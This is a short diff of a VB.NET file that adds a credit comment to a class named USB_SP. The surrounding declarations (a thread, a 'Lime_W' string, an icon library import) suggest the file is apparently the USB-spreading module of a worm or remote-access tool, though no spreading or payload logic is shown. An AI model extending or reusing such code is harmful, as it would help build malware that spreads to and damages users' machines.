@@ -8,6 +8,7 @@ Imports System.Text
 Imports System.Drawing.IconLib
 
 Public Class USB_SP
+'credit to napoleon
     Public Shared SNT As New Thread(AddressOf SI, 1)
     Public Shared M As String = "Lime_W"
     Public Shared Directory As String = "!@"
